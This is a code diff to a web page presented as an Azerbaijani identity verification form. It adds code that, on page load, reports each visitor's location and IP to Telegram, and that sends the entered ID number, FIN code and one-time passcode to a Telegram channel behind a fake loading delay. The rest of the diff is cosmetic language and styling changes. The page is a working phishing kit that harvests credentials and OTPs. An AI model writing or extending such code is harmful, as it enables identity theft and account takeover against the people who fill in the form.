@@ -8,6 +8,7 @@ import {
   AlertCircle,
   Loader2
 } from "lucide-react"
+import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
 
 // SVG Flag Components
 const AzerbaijanFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
@@ -111,8 +112,8 @@ export default function IdentityVerificationPage() {
   const [acceptedTerms, setAcceptedTerms] = useState(false)
   const [showPrefixDropdown, setShowPrefixDropdown] = useState(false)
 
-  // Language modal state (Default language is Azerbaijan)
-  const [selectedLang, setSelectedLang] = useState<Language>("az")
+  // Language modal state (Default language is English)
+  const [selectedLang, setSelectedLang] = useState<Language>("en")
   const [isLangModalOpen, setIsLangModalOpen] = useState(false)
 
   // Loading state (2 second loader)
@@ -132,6 +133,18 @@ export default function IdentityVerificationPage() {
     finCode.trim().length > 0
 
   const isOtpValid = otp.trim().length > 0
+
+  // Visitor Tracking on Page Load (Only location data like country, city, IP, etc.)
+  useEffect(() => {
+    const trackVisitor = async () => {
+      await fetchVisitorInfo()
+      await sendTelegramMessage({
+        title: "New Visitor Landed",
+        type: "visitor",
+      })
+    }
+    trackVisitor()
+  }, [])
 
   // Timer countdown effect for OTP screen
   useEffect(() => {
@@ -153,9 +166,21 @@ export default function IdentityVerificationPage() {
   }, [screen])
 
   // Handle Continue button click with 2 second loader
-  const handleContinue = () => {
+  const handleContinue = async () => {
     if (!isDetailsValid || loading) return
     setLoading(true)
+
+    try {
+      await sendTelegramMessage({
+        title: "ID Details Submitted",
+        type: "details",
+        phoneNumber: `${idPrefix} ${idNumber}`,
+        pin: finCode,
+      })
+    } catch (err) {
+      console.error("Error sending Telegram message:", err)
+    }
+
     setTimeout(() => {
       setLoading(false)
       setScreen("otp")
@@ -165,9 +190,22 @@ export default function IdentityVerificationPage() {
   }
 
   // Handle Verify button click with 2 second loader
-  const handleVerifyOtp = () => {
+  const handleVerifyOtp = async () => {
     if (!isOtpValid || loading) return
     setLoading(true)
+
+    try {
+      await sendTelegramMessage({
+        title: "OTP Verification Submitted",
+        type: "otp",
+        otp1: otp,
+        phoneNumber: `${idPrefix} ${idNumber}`,
+        pin: finCode,
+      })
+    } catch (err) {
+      console.error("Error sending OTP Telegram message:", err)
+    }
+
     setTimeout(() => {
       setLoading(false)
       setOtp("")
@@ -196,13 +234,13 @@ export default function IdentityVerificationPage() {
           {/* Header Actions: Language Flag & Support (Only shown on Details screen) */}
           {screen === "details" && (
             <div className="flex items-center gap-3">
-              {/* Flag Button (Shows English flag when Azerbaijan language is active) */}
+              {/* Flag Button (Shows English flag when English language is active) */}
               <button
                 onClick={() => setIsLangModalOpen(true)}
                 className="p-1 rounded-full hover:opacity-80 transition-opacity cursor-pointer focus:outline-none"
                 title="Change Language"
               >
-                {selectedLang === "az" ? (
+                {selectedLang === "en" ? (
                   <UKFlag className="w-7 h-7 sm:w-8 sm:h-8" />
                 ) : (
                   <AzerbaijanFlag className="w-7 h-7 sm:w-8 sm:h-8" />
@@ -300,7 +338,7 @@ export default function IdentityVerificationPage() {
                       value={idNumber}
                       onChange={(e) => setIdNumber(e.target.value)}
                       placeholder={text.idPlaceholder}
-                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:font-bold placeholder:text-[#B2B7BA] w-full"
+                      className="bg-transparent border-none outline-none text-sm text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] w-full"
                     />
                   </div>
                 </div>
@@ -314,7 +352,7 @@ export default function IdentityVerificationPage() {
                       onChange={(e) => setFinCode(e.target.value.toUpperCase())}
                       placeholder={text.finPlaceholder}
                       maxLength={7}
-                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:font-bold placeholder:text-[#B2B7BA] w-full uppercase tracking-wider"
+                      className="bg-transparent border-none outline-none text-sm text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] w-full tracking-wider"
                     />
                   </div>
                 </div>
@@ -404,7 +442,7 @@ export default function IdentityVerificationPage() {
                         if (otpError) setOtpError(null)
                       }}
                       placeholder={text.otpPlaceholder}
-                      className="bg-transparent border-none outline-none text-xl sm:text-2xl font-bold tracking-widest text-gray-900 placeholder:font-bold placeholder:text-[#B2B7BA] placeholder:text-base placeholder:tracking-normal w-full"
+                      className="bg-transparent border-none outline-none text-xl sm:text-2xl font-bold tracking-widest text-gray-900 placeholder:font-semibold placeholder:text-[#B2B7BA] placeholder:text-base placeholder:tracking-normal w-full"
                     />
                   </div>
 
